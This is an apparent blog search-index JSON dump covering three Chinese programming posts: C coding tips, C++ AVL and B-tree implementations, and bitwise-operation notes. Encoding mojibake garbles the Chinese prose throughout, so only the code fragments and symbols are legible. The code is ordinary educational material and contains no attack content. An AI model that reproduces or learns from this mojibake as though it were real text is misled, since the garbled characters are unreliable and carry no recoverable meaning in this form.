æä¾›äº†ç”¨æˆ·æ‰‹å†Œï¼Œå¦‚æœä½ çœŸçš„æƒ³å¥½å¥½åˆ©ç”¨è¿™ä¸ªå¹³å°çš„è¯ï¼Œè¯·é˜…è¯»ä¸€ä¸‹ã€‚ä¸€äº›å…¶å®ƒ OJ ä¹Ÿæœ‰ç±»ä¼¼çš„æ–‡æ¡£ã€‚ä½†æ˜¯ Online Judge åªæ˜¯å¹³å°ï¼ŒCoding æ‰æ˜¯å…³é”®ã€‚å¿…é¡»åœ¨æœ€åå¼ºè°ƒçš„ä¸€ç‚¹æ˜¯ï¼šå°½åŠ›ç‹¬ç«‹æ€è€ƒï¼Œç»å¯¹ä¸æŠ„ä»£ç ã€‚ ","date":"2018-10-17","objectID":"/c-tips/:1:0","tags":["C/C++"],"title":"ä¸€ç‚¹ C è¯­è¨€çš„ç»éªŒ","uri":"/c-tips/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"ç»éªŒåˆ†äº« å®½æ³›çš„å†…å®¹ä¸Šé¢çš„å›ç­”å·²ç»åŸºæœ¬æ¶µç›–äº†ï¼Œä¸‹é¢æ˜¯ 30 æ¡å…·ä½“çš„ä¸œè¥¿ï¼Œè¯·ç»“åˆæœç´¢å¼•æ“é£Ÿç”¨ã€‚ ","date":"2018-10-17","objectID":"/c-tips/:2:0","tags":["C/C++"],"title":"ä¸€ç‚¹ C è¯­è¨€çš„ç»éªŒ","uri":"/c-tips/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"ç¼–è¯‘ä¸é“¾æ¥ ä¸€ä¸ªç¼–è¯‘å•å…ƒä¸­å®šä¹‰çš„å…¨å±€å˜é‡åˆå§‹å€¼ä¸è¦ä¾èµ–å®šä¹‰åœ¨å¦ä¸€ä¸ªç¼–è¯‘å•å…ƒä¸­çš„å…¨å±€å˜é‡åˆå§‹å€¼ã€‚ï¼ˆé“¾æ¥å™¨ä¸ä¿è¯åˆå§‹åŒ–é¡ºåºï¼‰ ","date":"2018-10-17","objectID":"/c-tips/:2:1","tags":["C/C++"],"title":"ä¸€ç‚¹ C è¯­è¨€çš„ç»éªŒ","uri":"/c-tips/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"æ•°æ®ç±»å‹ ä¸€ä¸ª void * ç±»å‹çš„æŒ‡é’ˆæ˜¯ä¸€ä¸ªåˆæ³•çš„æŒ‡é’ˆï¼Œå¸¸ç”¨äºå‡½æ•°å‚æ•°ä¸­ç”¨æ¥ä¼ é€’ä¸€ä¸ªå‡½æ•°ä¸å…¶è°ƒç”¨è€…ä¹‹é—´çº¦å®šå¥½ç±»å‹çš„å¯¹è±¡åœ°å€ï¼›è€Œä¸€ä¸ªå€¼ç­‰äº NULL çš„æŒ‡é’ˆè™½ç„¶ä¹Ÿæ˜¯ä¸€ä¸ªåˆæ³•çš„æŒ‡é’ˆï¼Œä½†ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æŒ‡é’ˆã€‚ æ ‡å‡† C è¯­è¨€å…è®¸ä»»ä½•é void * ç±»å‹æŒ‡é’ˆå’Œ void * ç±»å‹æŒ‡é’ˆä¹‹é—´è¿›è¡Œç›´æ¥çš„ç›¸äº’è½¬æ¢ï¼Œå¦‚ int * è½¬æ¢ä¸º void * å†è½¬æ¢ä¸º double *ï¼Œç„¶è€Œè¿™æ ·åšå­˜åœ¨ä¸æ˜“å¯Ÿè§‰çš„å®‰å…¨é—®é¢˜ï¼ˆå†…å­˜æ‰©å¼  / æˆªæ–­ï¼‰ã€‚ å¼ºåˆ¶è½¬æ¢æ—¶å¿…é¡»åŒæ—¶ç¡®ä¿å†…å­˜è®¿é—®çš„å®‰å…¨æ€§å’Œè½¬æ¢ç»“æœçš„å®‰å…¨æ€§ï¼Œå¹¶ä¸”å°½é‡ç”¨æ˜¾å¼çš„è½¬æ¢ã€‚ ","date":"2018-10-17","objectID":"/c-tips/:2:2","tags":["C/C++"],"title":"ä¸€ç‚¹ C è¯­è¨€çš„ç»éªŒ","uri":"/c-tips/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"æ ‡è¯†ç¬¦ä¸è¡¨è¾¾å¼ é¿å…ç”¨å‰å¯¼ _ å’Œ __ å®šä¹‰æ ‡è¯†ç¬¦ï¼Œå› ä¸ºä¸€äº›å†…éƒ¨åç§°å’Œé¢„å®šä¹‰çš„å®æ˜¯è¿™æ ·å‘½åçš„ã€‚ æ ‡è¯†ç¬¦å‘½ååº”è¯¥éµå¾ª KISS åŸåˆ™ï¼ˆKeep It Simple \u0026 Stupidï¼‰ï¼Œå¹¶ä¸”åº”è¯¥èƒ½è‡ªè¯´æ˜ã€‚ åˆ«è®°è¿ç®—ç¬¦ä¼˜å…ˆçº§ï¼Œç”¨æ‹¬å·ã€‚ ç”¨ \u0026\u0026 æ—¶æŠŠæœ€å¯èƒ½ false çš„å­è¡¨è¾¾å¼æ”¾å·¦è¾¹ï¼Œç”¨ || æ—¶æŠŠæœ€å¯èƒ½ true çš„å­è¡¨è¾¾å¼æ”¾å·¦è¾¹ã€‚ï¼ˆçŸ­è·¯åŸåˆ™ï¼‰åŒç†ï¼Œif/else ç»“æ„ä¸­æŠŠæœ€å¯èƒ½ true çš„æ¡ä»¶æ”¾å‰é¢ã€‚ æµ®ç‚¹æ•°æ¯”è¾ƒä¸è¦ç”¨ == å’Œ !=ï¼Œè€Œæ˜¯åƒè¿™æ ·ï¼š #define EPS 1e-6 // è®¾ç½®è¦æ±‚çš„ç²¾åº¦ if (fabs(x - y) \u003c= EPS); //x ç­‰äº y if (fabs(x - y) \u003e EPS); //x ä¸ç­‰äº y /* * å…¶ä¸­ x,y æ˜¯æµ®ç‚¹æ•°ã€‚fabs å‡½æ•°åœ¨ math.h ä¸­ï¼Œè®¡ç®—æµ®ç‚¹æ•°ç»å¯¹å€¼ã€‚ * ä¸è¿‡å¯¹æµ®ç‚¹æ•°ç”¨\u003eå’Œ \u003cæ˜¯å¯ä»¥çš„ï¼Œä¸è¿‡ä¸å»ºè®®ç”¨!(x\u003ey) \u0026\u0026 !(x\u003cy) æ¥åˆ¤æ–­ç›¸ç­‰ï¼Œå› ä¸ºè¿™å’Œ x==y è¯­ä¹‰ç­‰ä»·ã€‚ */ çœ‹åˆ°è¡¨è¾¾å¼é‡Œå‡ºç° error / warning æ—¶ï¼Œæƒ³æƒ³è¿ç®—ç¬¦ä¸¤ç«¯æ˜¯ä¸æ˜¯ç±»å‹ä¸€è‡´ã€‚ä¸è¦æŠŠæŒ‡é’ˆå’Œ 0 æ¯”è¾ƒï¼Œä¹Ÿä¸è¦æŠŠæ•°å€¼å’Œ NULL æ¯”è¾ƒã€‚ ","date":"2018-10-17","objectID":"/c-tips/:2:3","tags":["C/C++"],"title":"ä¸€ç‚¹ C è¯­è¨€çš„ç»éªŒ","uri":"/c-tips/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"å¾ªç¯ C æŒ‰å…ˆè¡Œååˆ—çš„é¡ºåºå­˜å‚¨æ•°ç»„å…ƒç´ ï¼Œæ‰€ä»¥ä¸¤å±‚ for éå†æ—¶ï¼Œå…ˆè¡Œååˆ—æ¯”å…ˆåˆ—åè¡Œå¿«å‡ åå€ã€‚è¿™å¬èµ·æ¥ä¸å¯æ€è®®ï¼ˆæ€»å¾ªç¯æ¬¡æ•°æ˜¯ä¸€æ ·çš„ï¼‰ï¼Œä¸å¦¨å†™ä¸¤ä¸ªç¨‹åºè¯•è¯•ï¼Ÿï¼ˆåŸç†è§ç¥ä¹¦ CSAPPï¼‰ å¾ªç¯ä½“å†…å­˜åœ¨é€»è¾‘åˆ¤æ–­ï¼Œå¹¶ä¸”å¾ªç¯æ¬¡æ•°å¾ˆå¤šæ—¶ï¼Œè¯•è¯•æŠŠé€»è¾‘åˆ¤æ–­ç§»åˆ°å¤–é¢ã€‚ å°‘ç”¨ gotoï¼Œé™¤éè¦ä»å¤šå±‚å¾ªç¯é‡Œç›´æ¥è·³å‡ºæ¥ã€‚ ","date":"2018-10-17","objectID":"/c-tips/:2:4","tags":["C/C++"],"title":"ä¸€ç‚¹ C è¯­è¨€çš„ç»éªŒ","uri":"/c-tips/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"å‡½æ•° å‡½æ•°è°ƒç”¨ä¸­å‚æ•°ä¼ é€’çš„æœ¬è´¨å°±æ˜¯ç”¨å®å‚æ¥åˆå§‹åŒ–å½¢å‚è€Œä¸æ˜¯æ›¿æ¢å½¢å‚ã€‚ å¦‚æœå‚æ•°æ˜¯æŒ‡é’ˆï¼Œä¸”ä»…åšè¾“å…¥ç”¨ï¼Œåˆ™åº”åœ¨ç±»å‹å‰åŠ  constï¼Œé˜²æ­¢è¯¥æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜å•å…ƒè¢«æ— æ„ä¿®æ”¹ã€‚ ä¸è¦çœç•¥è¿”å›å€¼ç±»å‹ï¼Œæ²¡è¿”å›å€¼å°±ç”¨ voidã€‚æ ‡å‡† C è¯­è¨€ä¸­ï¼Œä¸åŠ ç±»å‹è¯´æ˜çš„å‡½æ•°ä¸€å¾‹æŒ‰ int ç±»å‹å¤„ç†ã€‚ å‡½æ•°åå’Œè¿”å›å€¼åœ¨è¯­ä¹‰ä¸Šä¸å¯å†²çªã€‚ä¸è¦å°†æ­£å¸¸å€¼å’Œé”™è¯¯æ ‡å¿—æ··åœ¨ä¸€èµ·è¿”å›ã€‚å»ºè®®æ­£å¸¸å€¼ç”¨è¾“å‡ºå‚æ•°è·å¾—ï¼Œè€Œé”™è¯¯æ ‡å¿—ç”¨ return è¿”å›ã€‚å¼ºè°ƒè¿™ä¸ªæ˜¯å› ä¸º C æ ‡å‡†åº“ä¸­å…¸å‹çš„åé¢æ•™æï¼šgetchar()ã€‚çœ‹å‡½æ•°åä¼¼ä¹åº”è¯¥è¿”å› char ç±»å‹ï¼Œå®é™…ä¸Šå®ƒå´è¿”å› int ç±»å‹ï¼Œåªå› ä¸ºè¦è¿”å›é”™è¯¯æ ‡å¿— EOFï¼Œä¹Ÿå°±æ˜¯ -1ã€‚ return è¯­å¥ä¸å¯è¿”å›æŒ‡å‘å †æ ˆï¼ˆå¦‚å‡½æ•°å†…å±€éƒ¨å˜é‡ï¼‰çš„æŒ‡é’ˆï¼Œå› ä¸ºè¯¥å†…å­˜å•å…ƒåœ¨å‡½æ•°ä½“ç»“æŸæ—¶è¢«è‡ªåŠ¨é‡Šæ”¾ã€‚ å°½ç®¡è¯­æ³•å…è®¸ï¼Œä¸è¦åœ¨å†…å±‚ç¨‹åºå—ä¸­å®šä¹‰ä¼šå±è”½å¤–å±‚ç¨‹åºå—ä¸­åŒåæ ‡è¯†ç¬¦çš„æ ‡è¯†ç¬¦ï¼Œå¦åˆ™ä¼šæŸå®³ç¨‹åºçš„æ¸…æ™°æ€§ã€‚ å­¦ç”¨ assert å®ã€‚ ","date":"2018-10-17","objectID":"/c-tips/:2:5","tags":["C/C++"],"title":"ä¸€ç‚¹ C è¯­è¨€çš„ç»éªŒ","uri":"/c-tips/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"æŒ‡é’ˆ ä¸ç®¡ä»€ä¹ˆæŒ‡é’ˆå˜é‡éƒ½è¦åœ¨å£°æ˜çš„æ—¶å€™å°±åˆå§‹åŒ–å®ƒï¼ŒNULL ä¹Ÿè¡Œã€‚ å°†æŒ‡é’ˆåŠ  / å‡æ­£æ•´æ•° i ç­‰ä»·äºåŠ  / å‡ i*sizeof(æŒ‡é’ˆæ‰€æŒ‡æ•°æ®ç±»å‹)ã€‚ ä¼ æŒ‡é’ˆæœ¬è´¨ä¸Šæ˜¯ä¼ åœ°å€ã€‚ è¡¨ç¤º a æ•°ç»„ç¬¬ 4 ä¸ªå…ƒç´  a[3] å±…ç„¶è¿˜å¯ä»¥å†™æˆ 3[a]ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿï¼ˆæˆ‘å¼€å§‹å†™æ•°ç»„ç›¸å…³çš„å†…å®¹äº†ï¼Œå´è¿˜æ˜¯åœ¨æŒ‡é’ˆæ¿å—ï¼Œè¿™åˆæ˜¯ä¸ºä»€ä¹ˆï¼Ÿï¼‰ å¤šç»´æ•°ç»„ä½œä¸ºå‡½æ•°å‚æ•°æ—¶ï¼Œä¸ºä»€ä¹ˆä¸éœ€è¦è¯´æ˜ç¬¬ä¸€ç»´çš„å¤§å°è€Œå¿…é¡»è¯´æ˜åé¢æ‰€æœ‰ç»´çš„å¤§å°ï¼Ÿ å³ä½¿ä½ è§‰å¾—è‡ªå·±ä¸ä¼šå¿˜è®°å­—ç¬¦æ•°ç»„æœ«å°¾çš„ \\0ï¼Œä½ è¿˜æ˜¯ä¼šå¿˜è®°ã€‚ï¼ˆæœ‰äº›åº“å‡½æ•°ä¸ä¼šè‡ªåŠ¨åŠ  \\0ï¼‰ å¯¹ä¸‹é¢çš„ä»£ç ï¼Œè¾“å‡º p å’Œ *p æœ‰ä»€ä¹ˆä¸åŒï¼Ÿ char ch = 'a'; char *p = \u0026ch; å‡½æ•°æŒ‡é’ˆäº†è§£ä¸€ä¸‹ã€‚ ","date":"2018-10-17","objectID":"/c-tips/:2:6","tags":["C/C++"],"title":"ä¸€ç‚¹ C è¯­è¨€çš„ç»éªŒ","uri":"/c-tips/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"ç»“æ„ä½“ ä½ å¯ä»¥ç”¨ â€œä½åŸŸâ€ æŒ‡å®š struct ä¸­æˆå‘˜å˜é‡æ‰€å çš„ bit æ•°ï¼ˆè€Œä¸æ˜¯ byteï¼‰ï¼Œåªä¸è¿‡æˆå‘˜ç±»å‹å¿…é¡»æ˜¯ int/unsigned int/signed int ä¹‹ä¸€ã€‚ æ ¹æ®è‡ªç„¶å¯¹é½çš„åŸç†ï¼Œåˆç†å®‰æ’æˆå‘˜å˜é‡çš„å£°æ˜é¡ºåºã€‚ï¼ˆè¯¦è§ç¥ä¹¦ CSAPPï¼‰ æœ€åæé†’å¤§å®¶ï¼Œç¨‹åºçš„æ­£ç¡®æ€§å›ºç„¶é‡è¦ï¼Œä½†æ˜¯ä¸€å®šä¸è¦è½»è§†å…¶å¯è¯»æ€§ã€å¯ç»´æŠ¤æ€§ã€å¥å£®æ€§ã€æ—¶ç©ºæ•ˆç‡ç­‰ç­‰ã€‚ä¸è¿‡ä¹Ÿä¸ç”¨çº ç»“å¤§æ‹¬å·æ¢ä¸æ¢è¡Œï¼Œç¼©è¿›ç”¨ Tab è¿˜æ˜¯ç©ºæ ¼çš„é—®é¢˜ã€‚ç¥å¤§å®¶éƒ½èƒ½å†™å‡ºæ¸…æ™°ã€é«˜æ•ˆçš„ä¼˜è´¨ä»£ç ï¼ ","date":"2018-10-17","objectID":"/c-tips/:2:7","tags":["C/C++"],"title":"ä¸€ç‚¹ C è¯­è¨€çš„ç»éªŒ","uri":"/c-tips/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"æ•°æ®ç»“æ„ä¸Šæœºè¯¾èŠ±äº†ç‚¹æ—¶é—´å®ç°çš„ä¸¤ç§ç›¸å¯¹å¤æ‚çš„æ•°æ®ç»“æ„ã€‚åŸºæœ¬ä¸Šåœ¨æŠ„ä¹¦ã€‚ ","date":"2018-06-13","objectID":"/avl-b-tree/:0:0","tags":["C/C++"],"title":"AVL æ ‘å’Œ B æ ‘","uri":"/avl-b-tree/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"AVL æ ‘ åŒ…å«äº†äºŒå‰æ ‘ã€äºŒå‰æŸ¥æ‰¾æ ‘å’Œ AVL æ ‘çš„å®ç°ï¼Œä¸è¿‡æ¯•ç«Ÿæ²¡æœ‰çœŸæ­£å­¦è¿‡ C++ï¼Œå¯¹ OOP ä¹Ÿè¿˜ä¸ç®—å¾ˆç†Ÿæ‚‰ï¼Œç¢°åˆ°äº†ä¸€äº›é—®é¢˜ï¼š ç»§æ‰¿çš„ç±»ä¹Ÿä¸èƒ½è®¿é—®çˆ¶ç±»çš„ private æˆå‘˜ï¼Œä¸è¿‡å¯ä»¥ç”¨ using çˆ¶ç±»:: æˆå‘˜å çš„æ–¹å¼è®¿é—®çˆ¶ç±»çš„ protected æˆå‘˜ å­ç±»ä¸­é‡è½½äº†çˆ¶ç±»çš„æŸä¸ªæˆå‘˜å‡½æ•°åï¼Œå¯¹å­ç±»å’Œçˆ¶ç±»ä¸­çš„è¯¥å‡½æ•°åŒæ—¶åŠ  virtual å…³é”®å­—ä¿®é¥°ï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶åˆ¤æ–­å…·ä½“éœ€è¦è°ƒç”¨çš„å‡½æ•°æ˜¯å“ªä¸€ä¸ªç‰ˆæœ¬ ","date":"2018-06-13","objectID":"/avl-b-tree/:1:0","tags":["C/C++"],"title":"AVL æ ‘å’Œ B æ ‘","uri":"/avl-b-tree/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"ä»£ç  #include \u003ciostream\u003e#include \u003cstack\u003eusing namespace std; enum Balance_factor {left_higher, equal_height, right_higher}; enum Error_code {success, not_present, duplicate_error}; template \u003cclass Record\u003e struct Binary_node { Record data; Binary_node\u003cRecord\u003e *left, *right; Binary_node() {left = right = NULL;}; Binary_node(const Record \u0026x) {data = x; left = right = NULL;}; virtual void set_balance(Balance_factor b) {}; virtual Balance_factor get_balance() const {return equal_height;}; }; template \u003cclass Record\u003e class Binary_tree { public: Binary_tree() {root = NULL; count = 0;}; bool empty() const {return !root;}; int size() const {return count;}; int height() const { if (!count) return 0; int tmp, i; for (tmp = 1, i = 0; tmp \u003c= count; ++i) tmp \u003c\u003c= 1; return i; } void preorder(void (*visit)(Record \u0026)) {recursive_preorder(root, visit);}; void inorder(void (*visit)(Record \u0026)) {recursive_inorder(root, visit);}; void postorder(void (*visit)(Record \u0026)) {recursive_postorder(root, visit);}; void insert(Record \u0026); protected: Binary_node\u003cRecord\u003e *root; int count; void recursive_preorder(Binary_node\u003cRecord\u003e *sub_root, void (*visit)(Record \u0026)) { if (sub_root) { (*visit)(sub_root-\u003edata); recursive_preorder(sub_root-\u003eleft, visit); recursive_preorder(sub_root-\u003eright, visit); } } void recursive_inorder(Binary_node\u003cRecord\u003e *sub_root, void (*visit)(Record \u0026)) { if (sub_root) { recursive_inorder(sub_root-\u003eleft, visit); (*visit)(sub_root-\u003edata); recursive_inorder(sub_root-\u003eright, visit); } } void recursive_postorder(Binary_node\u003cRecord\u003e *sub_root, void (*visit)(Record \u0026)) { if (sub_root) { recursive_postorder(sub_root-\u003eleft, visit); recursive_postorder(sub_root-\u003eright, visit); (*visit)(sub_root-\u003edata); } } }; template \u003cclass Record\u003e void Binary_tree\u003cRecord\u003e::insert(Record \u0026x) { if(empty()) { root = new Binary_node\u003cRecord\u003e(x); ++count; return; } stack\u003cint\u003e numbers; int item = 0, tmpcount = size(); while (tmpcount\u003e 0) { numbers.push((tmpcount\u00261) ? 1:2); tmpcount = (tmpcount-1)\u003e\u003e1; } Binary_node\u003cRecord\u003e *current = root; while (numbers.size() \u003e 1) { item = numbers.top(); if (item == 1) current = current-\u003eleft; if (item == 2) current = current-\u003eright; numbers.pop(); } item = numbers.top(); if (item == 1) current-\u003eleft = new Binary_node\u003cRecord\u003e(x); if (item == 2) current-\u003eright = new Binary_node\u003cRecord\u003e(x); ++count; } template \u003cclass Record\u003e class Search_tree: public Binary_tree\u003cRecord\u003e { public: Error_code insert(const Record \u0026new_data) { Error_code result = search_and_insert(root, new_data); if (result == success) ++count; return result; } Error_code remove(const Record \u0026target) { Error_code result = search_and_destroy(root, target); if (result == success) --count; return result; } Error_code tree_search(Record \u0026target) const { Error_code result = success; Binary_node\u003cRecord\u003e *found = search_for_node(root, target); if (!found) result = not_present; else target = found-\u003edata; return result; } protected: using Binary_tree\u003cRecord\u003e::root; using Binary_tree\u003cRecord\u003e::count; Binary_node\u003cRecord\u003e *search_for_node(Binary_node\u003cRecord\u003e* sub_root, const Record \u0026target) const; Error_code search_and_insert(Binary_node\u003cRecord\u003e * \u0026sub_root, const Record \u0026new_data); Error_code search_and_destroy(Binary_node\u003cRecord\u003e* \u0026sub_root, const Record \u0026target); Error_code remove_root(Binary_node\u003cRecord\u003e * \u0026sub_root); }; template \u003cclass Record\u003e Binary_node\u003cRecord\u003e *Search_tree\u003cRecord\u003e::search_for_node( Binary_node\u003cRecord\u003e* sub_root, const Record \u0026target) const { if (!sub_root || sub_root-\u003edata == target) return sub_root; else if (sub_root-\u003edata \u003ctarget) return search_for_node(sub_root-\u003eright, target); else return search_for_node(sub_root-\u003eleft, target); } template \u003cclass Record\u003e Error_code Search_tree\u003cRecord\u003e::search_and_insert( Binary_node\u003cRecord\u003e * \u0026sub_root, const Record \u0026new_data) { if (!sub_root) { sub_root = new Binary_node\u003cRecord\u003e(new_data); return success; } else if (new_data \u003c sub_root-\u003edata) return search_and_insert(sub_root-\u003eleft, new_data); else if (new_data\u003e sub_root-\u003eda","date":"2018-06-13","objectID":"/avl-b-tree/:1:1","tags":["C/C++"],"title":"AVL æ ‘å’Œ B æ ‘","uri":"/avl-b-tree/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"B æ ‘ è¿™é‡Œä¸èµ˜è¿°å…·ä½“åŸç†äº†ï¼Œåªè®°å½•ä¸€ä¸‹ä»£ç ã€‚ è¯´èµ·æ¥ï¼ŒB æ ‘åˆå« B-æ ‘ï¼Œç„¶è€Œä¸­é—´å¹¶ä¸æ˜¯å‡å·è€Œæ˜¯è¿æ¥ç¬¦ï¼›åŒæ—¶ï¼Œæ•°æ®åº“ç´¢å¼•ä½¿ç”¨çš„ B+ æ ‘ä¸­é—´çš„ + å·åˆçœŸçš„æ˜¯åŠ å·â€¦â€¦ ","date":"2018-06-13","objectID":"/avl-b-tree/:2:0","tags":["C/C++"],"title":"AVL æ ‘å’Œ B æ ‘","uri":"/avl-b-tree/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"ä»£ç  #include \u003ciostream\u003eusing namespace std; template \u003cclass Record, int order\u003e struct B_node { int cnt; Record data[order-1]; B_node\u003cRecord, order\u003e *branch[order]; B_node() {cnt = 0;} }; enum Error_code {not_present, duplicate_error, overflow, success}; template\u003cclass Record,int order\u003e class B_tree { public: B_tree() {root = nullptr;} Error_code search_tree(Record \u0026target) { return recursive_search_tree(root, target); } Error_code insert(const Record \u0026new_entry); Error_code remove(const Record \u0026target); private: B_node\u003cRecord, order\u003e *root; Error_code recursive_search_tree(B_node\u003cRecord, order\u003e *current, Record \u0026target); Error_code search_node(B_node\u003cRecord, order\u003e *current, const Record \u0026target, int \u0026pos); Error_code push_down(B_node\u003cRecord, order\u003e *current, const Record \u0026new_entry, Record \u0026median, B_node\u003cRecord, order\u003e * \u0026right_branch); void push_in(B_node\u003cRecord, order\u003e *current, const Record \u0026entry, B_node\u003cRecord, order\u003e *right_branch, int pos); void split_node(B_node\u003cRecord, order\u003e *current, const Record \u0026extra_entry, B_node\u003cRecord, order\u003e *extra_branch, int pos, B_node\u003cRecord, order\u003e * \u0026right_half, Record \u0026median); Error_code recursive_remove(B_node\u003cRecord, order\u003e *current, const Record \u0026target); void remove_data(B_node\u003cRecord, order\u003e *current, int pos) { for (int i = pos; i \u003c current-\u003ecnt-1; ++i) current-\u003edata[i] = current-\u003edata[i+1]; --current-\u003ecnt; } void copy_in_predecessor(B_node\u003cRecord, order\u003e *current, int pos) { B_node\u003cRecord, order\u003e *leaf = current-\u003ebranch[pos]; while (leaf-\u003ebranch[leaf-\u003ecnt]) leaf = leaf-\u003ebranch[leaf-\u003ecnt]; current-\u003edata[pos] = leaf-\u003edata[leaf-\u003ecnt-1]; } void restore(B_node\u003cRecord, order\u003e *current, int pos); void move_left(B_node\u003cRecord, order\u003e *current, int pos); void move_right(B_node\u003cRecord, order\u003e *current, int pos); void combine(B_node\u003cRecord, order\u003e *current, int pos); }; template\u003cclass Record, int order\u003e Error_code B_tree\u003cRecord, order\u003e::recursive_search_tree(B_node\u003cRecord, order\u003e *current, Record \u0026target) { Error_code result = not_present; int pos; if (current) { result = search_node(current, target, pos); if (result == not_present) result = recursive_search_tree(current-\u003ebranch[pos], target); else target = current-\u003edata[pos]; } return result; } template\u003cclass Record, int order\u003e Error_code B_tree\u003cRecord, order\u003e::search_node(B_node\u003cRecord, order\u003e *current, const Record \u0026target, int \u0026pos) { pos = 0; while (pos \u003c current-\u003ecnt \u0026\u0026 target \u003e current-\u003edata[pos]) ++pos; if (pos \u003c current-\u003ecnt \u0026\u0026 target == current-\u003edata[pos]) return success; else return not_present; } template\u003cclass Record, int order\u003e Error_code B_tree\u003cRecord, order\u003e::insert(const Record \u0026new_entry) { Record median; B_node\u003cRecord, order\u003e *right_branch, *new_root; Error_code result = push_down(root, new_entry, median, right_branch); if (result == overflow) { new_root = new B_node\u003cRecord, order\u003e; new_root-\u003ecnt = 1; new_root-\u003edata[0] = median; new_root-\u003ebranch[0] = root; new_root-\u003ebranch[1] = right_branch; root = new_root; result = success; } return result; } template\u003cclass Record, int order\u003e Error_code B_tree\u003cRecord, order\u003e::push_down(B_node\u003cRecord, order\u003e *current, const Record \u0026new_entry, Record \u0026median, B_node\u003cRecord, order\u003e * \u0026right_branch) { Error_code result; int pos; if (!current) { median = new_entry; right_branch = nullptr; result = overflow; } else { if (search_node(current, new_entry, pos) == success) result = duplicate_error; else { Record extra_entry; B_node\u003cRecord, order\u003e *extra_branch; result = push_down(current-\u003ebranch[pos], new_entry, extra_entry, extra_branch); if (result == overflow) { if (current-\u003ecnt \u003corder-1) { result = success; push_in(current, extra_entry, extra_branch, pos); }else split_node(current, extra_entry, extra_branch, pos, right_branch, median); } } } return result; } template\u003cclass Record, int order\u003e void B_tree\u003cRecord, order\u003e::push_in(B_node\u003cRecord, order\u003e *current, const Record \u0026entry, B_node\u003cRecord, order\u003e *right_branch, int pos) { for (int i = current-\u003ecnt; i \u003e pos; --i) { current-\u003edata[i] = cu","date":"2018-06-13","objectID":"/avl-b-tree/:2:1","tags":["C/C++"],"title":"AVL æ ‘å’Œ B æ ‘","uri":"/avl-b-tree/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"å®è®­å‡†å¤‡çš„ç¬¬äºŒå¼¹ã€‚ ","date":"2018-03-11","objectID":"/bitwise-ops/:0:0","tags":["ä½è¿ç®—","C/C++"],"title":"ä½è¿ç®—ç”¨æ³•æ•´ç†","uri":"/bitwise-ops/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"ç®€ä»‹ æ•´ç†äº†ä¸€äº›å’Œä½è¿ç®—ç›¸å…³çš„å†…å®¹ï¼Œä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š é›†åˆçš„æ•´æ•°è¡¨ç¤º ä½è¿ç®—çš„å¸¸è§æŠ€å·§å’Œå¸¸ç”¨å…¬å¼ gcc ä¸­ __builtin ç³»åˆ—å‡½æ•°åŠ C++ ä¸­ bitset ç±»çš„ç®€ä»‹ ","date":"2018-03-11","objectID":"/bitwise-ops/:1:0","tags":["ä½è¿ç®—","C/C++"],"title":"ä½è¿ç®—ç”¨æ³•æ•´ç†","uri":"/bitwise-ops/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"é›†åˆçš„æ•´æ•°è¡¨ç¤º ä»¥ä¸‹å†…å®¹æ‘˜è‡ªæŒ‘æˆ˜ç¨‹åºè®¾è®¡ç«èµ›ï¼š åœ¨ç¨‹åºä¸­è¡¨ç¤ºé›†åˆçš„æ–¹æ³•æœ‰å¾ˆå¤šç§ï¼Œå½“å…ƒç´ æ•°æ¯”è¾ƒå°‘æ—¶ï¼Œåƒè¿™æ ·ç”¨äºŒè¿›åˆ¶ç æ¥è¡¨ç¤ºæ¯”è¾ƒæ–¹ä¾¿ã€‚é›†åˆ ${0,1,â€¦,n-1}$ çš„å­é›† S å¯ä»¥ç”¨å¦‚ä¸‹æ–¹å¼ç¼–ç æˆæ•´æ•°ã€‚ $$ f(S)=\\sum\\limits_{i\\in{S}}2^i $$ åƒè¿™æ ·è¡¨ç¤ºä¹‹åï¼Œä¸€äº›é›†åˆè¿ç®—å¯ä»¥å¯¹åº”åœ°å†™æˆå¦‚ä¸‹æ–¹å¼ã€‚ ç©ºé›†ï¼š0 åªå«æœ‰ç¬¬ i ä¸ªå…ƒç´ çš„é›†åˆï¼š1\u003c\u003ci å«æœ‰å…¨éƒ¨ n ä¸ªå…ƒç´ çš„é›†åˆï¼š(1\u003c\u003cn)-1 åˆ¤æ–­ç¬¬ i ä¸ªå…ƒç´ æ˜¯å¦å±äºé›†åˆ Sï¼šif (S\u003e\u003ei \u0026 1) å‘é›†åˆä¸­åŠ å…¥ç¬¬ i ä¸ªå…ƒç´ ï¼šS | 1\u003c\u003ci ä»é›†åˆä¸­å»é™¤ç¬¬ i ä¸ªå…ƒç´ ï¼šS \u0026 ~(1\u003c\u003ci) æ±‚ S å’Œ T çš„äº¤é›†ã€å¹¶é›†ï¼šS|T, S\u0026T æ­¤å¤–, æƒ³è¦å°†é›†åˆ ${0,1,â€¦,n-1}$ çš„æ‰€æœ‰å­é›†æšä¸¾å‡ºæ¥çš„è¯ï¼Œå¯ä»¥åƒä¸‹é¢è¿™æ ·ä¹¦å†™ï¼š for (int S = 0; S \u003c (1\u003c\u003cn); ++S) { // å¯¹å­é›†çš„å¤„ç† } æŒ‰è¿™ä¸ªé¡ºåºå¾ªç¯çš„è¯ï¼ŒS ä¾¿ä¼šä»ç©ºé›†å¼€å§‹ï¼Œç„¶åæŒ‰ç…§ {0},{1},{0,1},â€¦{0,1,â€¦,n-1} 